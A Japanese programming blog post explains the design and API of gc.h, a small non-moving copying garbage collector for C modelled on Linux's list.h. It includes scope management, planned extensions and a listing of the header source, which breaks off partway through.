<span id="listh" class="fragment"></span><a href="#listh"><i class="fa fa-link"></i></a>list.h</h2>

<p>まず、APIのデザインのベースとしたLinuxのlist.hの使い方について簡単に説明します。Linuxのlist.hは非常に綺麗なAPIを持つC言語のための連結リストライブラリです。例えば構造体<code>foo</code>の連結リストを作成する場合、構造体<code>foo</code>に<code>struct list_head</code>型のメンバを(どんな位置でもいいので)追加するだけです。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">foo</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">head</span><span class="p">;</span>
    <span class="p">...</span>
<span class="p">};</span>
</pre></div></div>

<p>fooを作成したら<code>head</code>メンバを<code>INIT_LIST_HEAD</code>で初期化してあげます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">foo</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span> <span class="o">*</span><span class="n">foo</span><span class="p">);</span>
<span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
</pre></div></div>

<p>リスト自体も<code>struct list_head</code>型で表されます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">list_head</span> <span class="n">list_of_foo</span><span class="p">;</span>
<span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">list_of_foo</span><span class="p">);</span>
</pre></div></div>

<p>追加や削除はfooそのものではなくfooのheadメンバに対して行います。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">list_of_foo</span><span class="p">);</span>
<span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
</pre></div></div>

<p>list_headのポインタから、それが属する構造体のポインタを得るには<code>list_entry</code>マクロを用います。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">h</span> <span class="o">=</span> <span class="n">list_of_foo</span><span class="p">.</span><span class="n">next</span><span class="p">;</span>  <span class="c1">// list_of_fooの1個目の要素</span>
<span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">list_entry</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="k">struct</span> <span class="n">foo</span><span class="p">,</span> <span class="n">head</span><span class="p">);</span> <span class="c1">// hが属する構造体へのポインタ</span>
</pre></div></div>

<p>ちなみにAPIから明らかですが、<code>struct foo</code>自体はどんな方法でアロケートされていても構いません。例えばスタックに確保した構造体であっても正しくリストのメンバとして扱われます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">foo</span> <span class="n">foo</span><span class="p">;</span>
<span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">.</span><span class="n">head</span><span class="p">);</span>
<span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">.</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">list_of_foo</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="gch" class="fragment"></span><a href="#gch"><i class="fa fa-link"></i></a>gc.h</h2>

<p>今回作ったgc.h(ファイル名がBoehmGCと被ってますね)はここ[4]に置いてあります。gc.hの使い方はlist.hと概ね同じです。GC対象にしたい構造体があればそれに<code>struct gc_head</code>型のメンバを追加します。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">foo</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="n">head</span><span class="p">;</span>
    <span class="p">...</span>
<span class="p">};</span>
</pre></div></div>

<p>次がポイントですが、<code>struct foo</code>型のオブジェクトをまず自分でアロケートしてから、GCに登録します。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">foo</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span> <span class="o">*</span><span class="n">foo</span><span class="p">);</span>
<span class="n">INIT_GC_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">foo</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">foo_type</span><span class="p">);</span>
</pre></div></div>

<p>ただし、この<code>foo_type</code>というのは事前に定義しておいた定数で、foo型がどのようにmarkされるか、freeされるかの情報を保持します。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">foo_mark</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">foo</span> <span class="o">=</span> <span class="n">gc_entry</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">foo</span><span class="p">,</span> <span class="n">head</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="cm">/* mark members of foo using `gc_mark` (if any) */</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">foo_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">foo</span> <span class="o">=</span> <span class="n">gc_entry</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">foo</span><span class="p">,</span> <span class="n">head</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="cm">/* free members of foo (if any) */</span>
    <span class="p">...</span>
    <span class="n">free</span><span class="p">(</span><span class="n">foo</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="n">foo_type</span> <span class="o">=</span> <span class="p">{</span> <span class="n">foo_mark</span><span class="p">,</span> <span class="n">foo_free</span> <span class="p">};</span>
</pre></div></div>

<p>ここで<code>foo_free</code>の中で<code>foo</code>自体をfreeしています。このように、ネイティブヒープからのアロケーションはプログラマが自分で行います。gc.hが管理するのは参照の生死だけです。オブジェクトが死んだ場合は事前に<code>INIT_GC_HEAD</code>で登録しておいたfree関数が呼ばれるので、その中で適切にネイティブヒープへメモリを返却するのもプログラマの責任です。そのようなデザインのおかげで、gc.hはlibcの関数を使用していません。</p>

<p>通常のGCではヒープの管理までGCが行うので、GCはもともと設定されたタイミングで自動で走ります。しかし、gc.hはネイティブヒープについて一切感知しないというデザインのため、GCが走るタイミングはプログラマが自分で制御する必要があります。<code>malloc</code>でアロケートしたメモリの総量を数えておき、域値を越えればGCを走らせるというのが通常の戦略になると思います。GCは<code>gc_run</code>関数を呼べば走ります。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="n">gc_run</span><span class="p">();</span>
</pre></div></div>

<p>さて、参照の生死の管理について説明します。gc.hは簡単なスコープ管理の機能を持っています。スコープは<code>gc_scope_open</code>で作成、<code>gc_scope_close</code>で破棄できます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="n">gc_scope_t</span> <span class="n">s</span> <span class="o">=</span> <span class="n">gc_scope_open</span><span class="p">();</span>

    <span class="p">...</span>

    <span class="n">gc_scope_close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>まず、<code>INIT_GC_HEAD</code>で初期化されたオブジェクトはその時点でのスコープに属する生存オブジェクトになります。スコープが閉じられると、その中で確保されたオブジェクトの参照が切れます。ここで、他からの参照が一切なくなってしまったオブジェクトは次回の<code>gc_run</code>で回収されます。スコープを閉じた後にオブジェクトを使用する場合は<code>gc_protect</code>を呼びます。下のようなコードを実行した場合(make_fooの定義は普通だとして)<code>a</code>は生き残りますが<code>b</code>は次回のGCで回収されます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="n">gc_scope_t</span> <span class="n">s</span> <span class="o">=</span> <span class="n">gc_scope_open</span><span class="p">();</span>

    <span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">make_foo</span><span class="p">();</span>
    <span class="k">struct</span> <span class="n">foo</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">make_foo</span><span class="p">();</span>

    <span class="n">gc_scope_close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="n">gc_protect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="解説" class="fragment"></span><a href="#%E8%A7%A3%E8%AA%AC"><i class="fa fa-link"></i></a>解説</h1>

<p>CheneyのコピーGC(以下単にコピーGC)の詳細についてはWikipediaとか[1]を参照してください。原理の解説をしようと思いましたが、実際には基本的にはコピーGCと全く同じです。ただし、non-movingにするためにTreadmill GCの考え方を用いています。Treadmill GCについてはこのWikiとか[2]をみてください。</p>

<p><code>struct gc_head</code>の中身は以下のようになっています。大きさが4ワードとかなり大きめです。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">gc_head</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">head</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">stack_next</span><span class="p">;</span>
<span class="p">};</span>
</pre></div></div>

<p><code>head</code>は全オブジェクト(生きているか、もしくは死んでいるが回収されていない)への二重連結リストにつながっています。<code>type</code>はこのオブジェクトに対してどのようなmarkとfreeを施すかの情報が入っています。<code>stack_next</code>はスコープの管理(=root setの管理)に用います。一重連結リストです。</p>

<p>GC全体の状態は一つの変数にまとまっています。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">gc_state</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">spaces</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">from</span><span class="p">;</span>
<span class="p">};</span>
</pre></div></div>

<p><code>spaces</code>はfromスペースとtoスペースを表す二重連結リストです。<code>stack</code>は現在のスコープのトップにあるgc_headを指しています。<code>from</code>はspacesのどちらがfromかを表す1bitの状態です。</p>

<p>spacesのfrom側はgc中でなければ全オブジェクトへの二重連結リストで、gc中はmarkされていないオブジェクトからなる二重連結リストです。spacesのto側はgc中でなければ常に空、gc中はmark済みのオブジェクトからなる二重連結リストです。Treadmill GCと違い、このGCではgc実行中に二つの異なる二重連結リストを使用します。これは通常のコピーGCの挙動に近いです。</p>

<p>スコープの管理は非常に簡単です。まず、gc_protectはオブジェクトを<code>stack</code>につなぎます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_protect</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">stack</span><span class="p">;</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="n">head</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>stackは<code>INIT_GC_HEAD</code>をすることでも伸びます。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">INIT_GC_HEAD</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    <span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">]);</span>
    <span class="n">gc_protect</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>そして、スコープのopenとcloseは現在の<code>stack</code>を記録、変更するだけです。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">gc_scope_t</span><span class="p">;</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">gc_scope_t</span> <span class="nf">gc_scope_open</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">gc</span><span class="p">.</span><span class="n">stack</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_scope_close</span><span class="p">(</span><span class="n">gc_scope_t</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p><code>stack</code>から繋がる全てのオブジェクトは生存していると見なされます。というか、root setは<code>stack</code>から繋がるオブジェクト全体と同じです。</p>

<h1>
<span id="パフォーマンス" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>パフォーマンス</h1>

<p>力尽きたので測ってません。</p>

<h1>
<span id="今後の拡張について" class="fragment"></span><a href="#%E4%BB%8A%E5%BE%8C%E3%81%AE%E6%8B%A1%E5%BC%B5%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>今後の拡張について</h1>

<p>少なくともこのリポジトリではこれ以上の拡張を行うことを予定してはいませんが、実際に使用する上では以下のような拡張が必要になるはずです。</p>

<ul>
<li>グローバルな参照への対応</li>
<li>マルチスレッド対応</li>
<li>インクリメンタルGC化</li>
<li>Mark&amp;Sweep化</li>
</ul>

<p>まず、現在の実装ではグローバルに保持される参照には対応していません。<code>stack</code>のチェインの下の方にうまくオブジェクトを繋いでおくことで擬似的にグローバル参照のようなものを作ることはできます。が、その場合一番下のスコープに番兵オブジェクトを置く必要があるため面倒です。おそらく<code>gc_state</code>にもう一つの二重連結リストを付け足してグローバルな参照をそこに全部つなぎ、マークフェイズでそれらをroot setとして扱うのが良いと思います。<code>stack_next</code>メンバを使った一重連結リストでも良いですがその場合グローバルな参照を削除するのに線形の時間が必要になってしまいます。</p>

<p>マルチスレッド対応は地道にlockを各所に入れれば良さそうです。<code>gc_state</code>の<code>stack</code>メンバはスレッドの数だけ用意すればcontentionが減りそうです。ただ、いずれにせよlockは必要ですが。一方で、各スレッドで独立したGCを動かす場合には、グローバル変数gcをスレッドローカルにするだけで良いはずです。</p>

<p>インクリメンタル化はTreadmill GCと同じやり方で簡単に実現できます。つまり、from空間からto空間へのmoveをインクリメンタルに行う(n個単位で行うとか)だけです。と、今書いてて思ったんですがこれいい感じにTask stealingな感じでマルチスレッドに出来ないんですかね。いかにもすでにありそうだけど。</p>

<p>現在のコピーGCに基づく実装は簡単でかつGC中に追加のメモリを必要としないという利点がありますが、一方でそれは必要な情報をオブジェクトのヘッダに入れているだけだと捉えることもできます。4ワードのヘッダは通常の感覚で言えばかなり大きいと思います。アルゴリズムをMark &amp; Sweepにすれば二重連結リストで管理している部分が一重で済むので3ワードにはなります。ただしその分GCを行うために追加の領域が必要になります。ちなみに、スコープの管理のために別にスタックを用意することにすれば<code>stack_next</code>を無くして2ワードまで減らせますが、メモリ使用量の観点からは効果がないです。(ただしキャッシュのヒット率が上がってGCが高速化される可能性は高いです。)</p>

<h1>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h1>

<p>その後よく考えたところいくつかの改良を行うことができました。まず、ヘッダーサイズを3ワードに減らすことができました。これ以上の削減にはアルゴリズムをマーク&amp;スイープにするなどの本質的な変更が必要で、またそのような変更を行なった場合、GC中に追加のメモリ領域を必要としないというコピーGCの恩恵は受けられないと思われます。今回のヘッダサイズ削減はヒープ全体の管理に使用している二重連結構造をルート集合の管理にも用いるようにしたことで実現されました。また、副次的な効果としてスコープの管理が柔軟になったため、グローバルな参照のサポートが簡単に実装できました。さらに、コメント欄で指摘を頂いたマルチスレッド化に向けたインターフェイスの変更についても利便性を損なわずに効率的に実装を行うことができるようになったため実装しました。具体的なコードはおまけ(その2)に追加しました。</p>

<p>見かけ上はスコープ管理に関連するAPIが変更されました。改良版ではスコープは以下のようにして作成します。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">gc_scope</span> <span class="n">s</span><span class="p">;</span>

<span class="n">gc_scope_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="p">...</span>
<span class="n">gc_scope_close</span><span class="p">();</span>
</pre></div></div>

<p>また<code>gc_preserve</code>と<code>gc_release</code>という二つの関数が追加されました。<code>gc_preserve</code>はオブジェクトとスコープを受け取り、オブジェクトの生存期間を指定されたスコープに変更します。<code>gc_release</code>はオブジェクトを受け取り、所属するスコープからの参照を削除します。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">gc_scope</span> <span class="n">s0</span><span class="p">;</span>
<span class="n">gc_scope_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s0</span><span class="p">);</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">gc_scope</span> <span class="n">s1</span><span class="p">;</span>
    <span class="n">gc_scope_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>

    <span class="n">obj</span> <span class="o">=</span> <span class="n">make_obj</span><span class="p">();</span>
    <span class="n">gc_preserve</span><span class="p">(</span><span class="o">&amp;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s0</span><span class="p">);</span>
    <span class="n">gc_scope_close</span><span class="p">();</span>

    <span class="c1">// obj is alive</span>
<span class="p">}</span>
<span class="n">gc_scope_close</span><span class="p">();</span>

<span class="c1">// obj is dead</span>
</pre></div></div>

<p><code>gc_preserve</code>の特殊な場合として、受け取ったオブジェクトの生存期間を現在のスコープからみて一つ下のスコープに延長する<code>gc_protect</code>と最上位のスコープに延長する<code>gc_pin</code>を追加しました。たいていの場合<code>gc_pin</code>は大域変数に代入されたオブジェクトに対して使用するはずです。</p>

<h1>
<span id="参照" class="fragment"></span><a href="#%E5%8F%82%E7%85%A7"><i class="fa fa-link"></i></a>参照</h1>

<ul>
<li>[1] <a href="https://en.wikipedia.org/wiki/Cheney%27s_algorithm" class="autolink" rel="nofollow noopener" target="_blank">https://en.wikipedia.org/wiki/Cheney%27s_algorithm</a>
</li>
<li>[2] <a href="http://seesaawiki.jp/w/author_nari/d/GC/extend/TreadmillGC%28Barker%201992%29" class="autolink" rel="nofollow noopener" target="_blank">http://seesaawiki.jp/w/author_nari/d/GC/extend/TreadmillGC%28Barker%201992%29</a>
</li>
<li>[3] <a href="https://github.com/kazuho/picogc" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/kazuho/picogc</a>
</li>
<li>[4] <a href="https://github.com/nyuichi/gc.h" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/nyuichi/gc.h</a>
</li>
</ul>

<h1>
<span id="おまけ" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>おまけ</h1>

<p>gc.hの全容。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="k">extern</span> <span class="k">struct</span> <span class="n">gc_state</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">spaces</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">from</span><span class="p">;</span>
<span class="p">}</span> <span class="n">gc</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">gc_head</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">head</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">stack_next</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">gc_object_type</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">mark</span><span class="p">)(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">);</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>

<span class="cp">#define gc_entry(ptr, type, field) container_of(ptr, type, field)</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="n">INIT_LIST_HEAD</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">gc_scope_t</span><span class="p">;</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">gc_scope_t</span> <span class="nf">gc_scope_open</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">gc</span><span class="p">.</span><span class="n">stack</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_scope_close</span><span class="p">(</span><span class="n">gc_scope_t</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_protect</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">stack</span><span class="p">;</span>
    <span class="n">gc</span><span class="p">.</span><span class="n">stack</span> <span class="o">=</span> <span class="n">head</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">INIT_GC_HEAD</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">gc_object_type</span> <span class="o">*</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    <span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">]);</span>
    <span class="n">gc_protect</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_mark</span><span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">|</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">list_move_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="mi">1</span> <span class="o">-</span> <span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">gc_run</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
    <span class="cm">/* copy live objects */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">head</span> <span class="o">=</span> <span class="n">gc</span><span class="p">.</span><span class="n">stack</span><span class="p">;</span> <span class="n">head</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">head</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">1ul</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">gc_mark</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="mi">1</span> <span class="o">-</span> <span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">],</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span>
            <span class="n">head</span><span class="o">-&gt;</span><span class="n">type</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">(</span><span class="n">head</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* clean up */</span>
    <span class="n">list_for_each_entry</span> <span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc</span><span class="p">.</span><span class="n">spaces</span><span class="p">[</span><span class="mi">1</span> <span class="o">-</span> <span class="n">gc</span><span class="p">.</span><span class="n">from</span><span class="p">],</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">gc_head</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">head</span><span class="o">-&gt;</span><span class="n">stack_next</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">1ul</span><span class="p">);</span>
    <span class="p">}</span>
